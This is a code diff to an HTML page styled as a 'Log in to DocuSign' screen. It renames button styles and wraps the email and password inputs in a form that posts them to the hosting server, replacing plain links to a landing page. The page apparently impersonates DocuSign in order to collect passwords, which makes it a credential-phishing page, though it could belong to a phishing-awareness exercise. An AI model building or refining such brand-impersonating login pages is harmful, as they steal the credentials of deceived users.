@@ -51,14 +51,14 @@
             text-align: left;
         }
         input {
-            width: 100%;
+            width: 90%;
             padding: 10px;
             font-size: 14px;
             border: 1px solid #cccccc;
             border-radius: 5px;
             box-sizing: border-box;
         }
-        .button {
+        .submit-button {
             display: inline-block;
             padding: 10px 20px;
             font-size: 16px;
@@ -67,8 +67,9 @@
             text-decoration: none;
             border-radius: 5px;
             transition: background-color 0.3s;
+            margin: 10px;
         }
-        .button:hover {
+        .submit-button:hover {
             background-color: #6b006b;
         }
         .signup-link {
@@ -90,13 +91,14 @@
         <h1>Log in to DocuSign</h1>
         <p class="subtitle">Enter your email to log in.</p>
         <div class="input-container">
-            <label for="email">Email*</label>
-            <input type="email" id="email" name="email" placeholder="Enter email">
-            <label for="email">Password*</label>
-            <input type="password" id="password" name="password" placeholder="Enter password">
+            <form action="" method="post">
+                <label for="email">Email*</label>
+                <input type="email" id="email" name="email" placeholder="Enter email">
+                <label for="email">Password*</label>
+                <input type="password" id="password" name="password" placeholder="Enter password">
+                <input type="submit" value="NEXT" class="submit-button"/>
+            </form>
         </div>
-        <a href="landing-page.html" class="button">NEXT</a>
-        <a href="landing-page.html" class="signup-link">Sign Up for Free</a>
     </div>
 </body>
 </html>
